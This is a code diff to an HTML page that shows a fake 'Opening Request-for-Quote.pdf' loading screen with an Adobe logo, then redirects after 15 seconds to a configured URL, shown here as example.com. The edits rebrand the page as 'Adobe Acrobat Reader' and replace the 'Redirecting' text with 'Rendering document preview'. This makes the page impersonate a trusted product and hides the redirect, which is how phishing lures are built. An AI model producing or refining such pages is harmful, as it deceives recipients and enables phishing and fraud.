@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Document Viewer</title>
+    <title>Adobe Acrobat Reader</title>
     <style>
       :root {
         color-scheme: light;
@@ -523,7 +523,7 @@
         <div class="spinner" aria-hidden="true">
           <img id="spinner-logo" class="spinner-logo" src="./adobe-logo.svg" alt="">
         </div>
-        <p class="viewer-company">Document Viewer</p>
+        <p class="viewer-company">Adobe Acrobat Reader</p>
         <h1>Opening <span id="opening-file-name">Request-for-Quote.pdf</span><span class="loading-dots" aria-hidden="true"></span></h1>
         <p id="redirect-message">Rendering document preview</p>
         <div class="opening-progress" aria-hidden="true"></div>
@@ -541,7 +541,7 @@
         "logoPath": "./adobe-logo.svg",
         "loadingDelayMs": 15000,
         "redirectUrl": "https://example.com",
-        "redirectMessage": "Redirecting to document preview"
+        "statusMessage": "Rendering document preview"
       }
     </script>
 
@@ -559,7 +559,7 @@
       const configuredLogoPath = config.logoPath || "./adobe-logo.svg";
       const loadingDelayMs = Number(config.loadingDelayMs) || 15000;
       const redirectUrl = String(config.redirectUrl || "").trim();
-      const redirectMessageText = config.redirectMessage || "Redirecting to document preview";
+      const redirectMessageText = config.statusMessage || "Rendering document preview";
 
       document.documentElement.style.setProperty("--spin-duration", `${loadingDelayMs}ms`);
 
